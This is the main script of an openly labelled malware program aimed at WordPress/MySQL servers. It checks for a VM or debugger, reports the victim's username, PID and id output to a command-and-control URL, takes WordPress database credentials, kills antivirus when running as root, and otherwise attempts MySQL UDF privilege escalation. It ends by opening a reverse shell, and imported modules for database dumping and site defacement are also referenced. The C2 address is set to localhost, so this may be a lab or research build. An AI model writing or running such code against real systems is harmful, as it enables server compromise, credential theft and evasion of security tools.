#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor
from socket import gethostbyname, gethostname
import os
import logging, sys
from queue import Queue
from time import sleep

from modules.malware.check_process import check_parent, kill_avs, wait_parent
from modules.cookie_comm import communication_client_main, read_file
from modules.malware.execute import reverse_shell_main, is_root
from modules.malware.mysql import dump_wp_db, priv_esc_udf
from modules.malware.wordpress import get_wp_db_creds
from modules.malware.defacement import defacement
from modules.crypto import encrypt, decrypt
from modules.hash import hash

from modules.malware.evasion import is_vm, is_debugger

IP = "127.0.0.1"
PORT = "8080"
URL = f"http://{IP}:{PORT}/api"

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()
    client_id = f"{gethostname()}-{gethostbyname(gethostname())}"

    if is_debugger() or is_vm():    # Check if there is a debugger or a vm
        print("is_debugger() or is_vm()")
        #sleep(60*12) # Sleep 12 min
        sleep(5)
    #  [%(thread)-6d] [%(threadName)-25s]
    FORMAT = '[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]'
    #logging.basicConfig(filename='malware.log', encoding='utf-8', format=FORMAT, level=0)
    #logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=30)

    user = os.popen('whoami').read().replace("\n","")
    #sleep(10)
    with ThreadPoolExecutor(max_workers=2) as executor:
        #logging.info("START MALWARE MAIN")
        print("STARTING ...")
        exfiltrate.put(f"[{user}] - [MAIN] PID: {os.getpid()}")
        id = os.popen('id').read().replace("\n","")
        exfiltrate.put(f"[{user}] - [MAIN] ID: {id}")
        executor.submit(communication_client_main, client_id, exfiltrate, instructions, encrypt, decrypt, 10, URL)
        status = check_parent()
        if not status:
            exfiltrate.put(f"[{user}] - [MAIN] - Parent")
            print("Parent")
            #defacement(exfiltrate, user)
            #sleep(60)
            db_creds = get_wp_db_creds(exfiltrate, user)
            if db_creds:
                pass
                #sleep(10)
                #dump_wp_db(db_creds, exfiltrate, user)    
            if is_root():
                exfiltrate.put(f"[{user}] - [MAIN] Is Root")
                print("Is Root")
                kill_avs()
            else:
                exfiltrate.put(f"[{user}] - [MAIN] Is not Root")
                print("Is not Root")
                if db_creds:
                    sleep(40)
                    priv_esc_udf(db_creds, exfiltrate, user)
            exfiltrate.put(f"[{user}] - [MAIN] Open Reverse Shell")
            exfiltrate.put('END')
        else:
            print("Child")
            exfiltrate.put(f"[{user}] - [MAIN] Child")
            wait_parent( exfiltrate, user)
            exfiltrate.put(f"[{user}] - [MAIN] Open Reverse Shell")
            exfiltrate.put('END') # flag to open shell 
        sleep(5)     
        executor.submit(reverse_shell_main, instructions, exfiltrate, 5)